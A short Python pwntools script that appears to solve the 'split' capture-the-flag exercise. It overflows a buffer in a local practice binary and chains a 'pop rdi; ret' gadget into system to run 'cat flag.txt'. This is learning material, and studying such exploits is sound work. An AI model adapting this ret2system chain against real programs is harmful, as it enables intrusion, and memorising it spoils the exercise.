#!/usr/bin/env python3

###
## authored by brvsh
## https://brv.sh/
###

from pwn import *

elf = context.binary = ELF("./split", checksec=False)
proc = process()

payload = flat([
    b"A" * 40,                              # padding
    p64(0x4007c3),                          # pop rdi; ret
    p64(0x601060),                          # *"/bin/cat flag.txt"
    p64(elf.sym["usefulFunction"] + 9)      # ret2system
])

proc.sendlineafter(b"\n> ", payload)
info("brvsh> payload sent!")
proc.recvuntil(b"Thank you!\n")
info(f"brvsh> FLAG! {proc.recvline().decode()}")
proc.close()
